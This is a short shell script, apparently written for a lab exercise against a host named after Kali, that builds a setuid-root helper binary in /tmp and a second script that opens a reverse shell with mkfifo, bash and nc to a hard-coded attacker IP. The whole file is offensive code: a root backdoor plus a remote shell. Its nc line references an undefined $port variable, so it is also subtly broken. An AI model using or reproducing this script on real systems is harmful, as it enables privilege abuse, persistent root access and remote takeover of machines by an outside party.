#!/usr/bin/sh

target=/tmp/escalate
im_root=/tmp/im_root.sh
kali_ip="192.168.56.1"
kali_port="1234"

gcc -o $target -x c - <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int
main(int argc, char *const *argv)
{
        if (-1 == setuid(0)) {
            perror("setuid failed");
            return EXIT_FAILURE;
        }

        char *args[] = {
            "/usr/bin/bash",
            "$im_root",
            NULL,
        };
        if (-1 == execv("/usr/bin/bash", (char *const *)args)) {
            perror("exec failed");
            return EXIT_FAILURE;
        }
        return 0;
}
EOF

chown root:users $target
chmod u+x $target
chmod ug+s $target


cat <<EOF > $im_root
#!/usr/bin/bash
rm -f /tmp/file
mkfifo /tmp/file
/bin/bash </tmp/file | nc $kali_ip $port >/tmp/file
EOF

